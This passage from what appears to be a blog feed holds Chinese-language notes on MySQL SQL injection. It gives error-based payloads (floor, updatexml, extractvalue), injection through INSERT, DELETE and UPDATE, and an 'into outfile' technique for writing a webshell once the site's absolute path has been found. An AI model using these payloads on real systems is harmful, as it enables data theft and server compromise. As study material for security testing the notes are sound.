class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">mysql基本注入流程</span><br><span class="line">   mysqk基本注入拓展</span><br><span class="line">   mysql注入权限</span><br><span class="line">   1.普通用户注入攻击</span><br><span class="line">       只能靠猜数据进行安全测试</span><br><span class="line">   2.root跨库注入，文件操作</span><br><span class="line">   @@version_compile_os 查询操作系统</span><br><span class="line">   由数据库进行连接的用户决定，谁连接就是谁的权限</span><br><span class="line">   3.sql注入写入文件</span><br><span class="line">       举例:id=-1&#x27;union select null,&#x27;aaa&#x27;,null,null into outfile(&quot;D:<span class="tag">\<span class="name">\</span></span>WWW<span class="tag">\<span class="name">\</span></span>1.txt&quot;)</span><br><span class="line">       aaa可以替换成shell代码，保存的文件可以换成shell.php 高危</span><br><span class="line">       有一个关键问题写入shell的时候你需要获取到网站的绝对路径否则无法用菜刀连接shell，写入的shell就没有意义</span><br><span class="line">       路径获取方法:</span><br><span class="line">               1.报错，有些网站报错的时候会带出路径的信息</span><br><span class="line">               2.phpinfo泄露网站绝对路径 script_filename 暴露绝对路径</span><br><span class="line">               3.查找漏洞信息爆路径</span><br><span class="line">               4.其他方法获取路径sql注入利用load_file()读取某些web容器的配置文件就能够获取网站的绝对路径</span><br><span class="line">                   select null,load_file(&#x27;dir<span class="tag">\<span class="name">filename</span></span>&#x27;),null,nulll</span><br><span class="line">                   iis6.0 C:<span class="tag">\<span class="name">Windows</span></span>/system32<span class="tag">\<span class="name">inetsrv</span></span><span class="tag">\<span class="name">metabase</span></span>.xml</span><br><span class="line">                   ii7.5 C:<span class="tag">\<span class="name">Windows</span></span><span class="tag">\<span class="name">System</span></span>32<span class="tag">\<span class="name">inetsrv</span></span><span class="tag">\<span class="name">config</span></span><span class="tag">\<span class="name">applicationHost</span></span>.config</span><br><span class="line">                   apache</span><br><span class="line">   mysql宽字节注入:</span><br><span class="line">       宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</span><br><span class="line">   </span><br><span class="line">   无回显报错注入</span><br><span class="line">       floor报错:</span><br><span class="line">           payload:</span><br><span class="line">               ?id=1&#x27;+and+(select+1+from(select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+</span><br><span class="line">               ?id=-1&#x27; and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br><span class="line">       updatexml报错:</span><br><span class="line">           updatexml()函数是mysql对xml文档上数据进行查询和修改的xpath函数，但是updatexml只能爆出32位的数据</span><br><span class="line">           payload:</span><br><span class="line">               id=1&#x27;and 1=(updatexml(1,concat(0x3a,(select version())),1))--+</span><br><span class="line">               对select version进行修改爆破数据</span><br><span class="line">       extractvalue报错:</span><br><span class="line">           payload:</span><br><span class="line">               id=1&#x27; and extractvalue(1,concat(0x73,user()))--+</span><br><span class="line">               对user()修改爆破数据</span><br><span class="line">   其他注入</span><br><span class="line">       select</span><br><span class="line">       insert</span><br><span class="line">           insert注入常和报错联系在一起 insert into table_name (id,username,password)values(id,&#x27;xxx&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">           insert into users(id,username,password)values(16,&#x27;oracle&#x27; or updatexml(1,concat(0x7e,(version())),0)or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">           insert into users(id,username,password)values(16,&#x27;oracle&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = database() limit 0,1)),0)or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">           因为updatexml报错只能回显32位的错误</span><br><span class="line">           还可以用extractvalue报错</span><br><span class="line">           insert into users(id,username,password)values(2,&#x27;float&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">       delete</span><br><span class="line">           后台管理里删除文章删除用户等操作</span><br><span class="line">           delete from users where id=1 or extractvalue(1,concat(0x7e,database())) or &#x27;&#x27;;</span><br><span class="line">       update</span><br><span class="line">       update users set password=&#x27;Nicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;&#x27;;</span><br><span class="line">           数据同步缓存等操作</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;figure class=&quot;highlight tex&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;首先什么是sql注入，sql注入是恶意用户将恶意的sql语句提交给服务端，并且带入数据库进行查询最终爆出各种数据的攻击手段&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="vuln" scheme="http://example.com/categories/vuln/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Welcome to my blog</title>
    <link href="http://example.com/2020/10/08/index/"/>
    <id>http://example.com/2020/10/08/index/</id>
    <published>2020-10-08T08:39:43.720Z</published>
    <updated>2020-10-09T04:31:22.230Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to my blog! my gtihub page <a href="https://github.com/yueqsun">Github</a> for more info. If you get any suggestion you can send email to <a href="mailto:&#x79;&#117;&#x65;&#113;&#115;&#x75;&#110;&#x40;&#49;&#x36;&#x33;&#46;&#x63;&#x6f;&#109;">&#x79;&#117;&#x65;&#113;&#115;&#x75;&#110;&#x40;&#49;&#x36;&#x33;&#46;&#x63;&#x6f;&#109;</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to my blog! my gtihub page &lt;a href=&quot;https://github.com/yueqsun&quot;&gt;Github&lt;/a&gt; for more info. If you get any suggestion you can send </summary>
      
    
    
    
    
  </entry>
  
</feed>
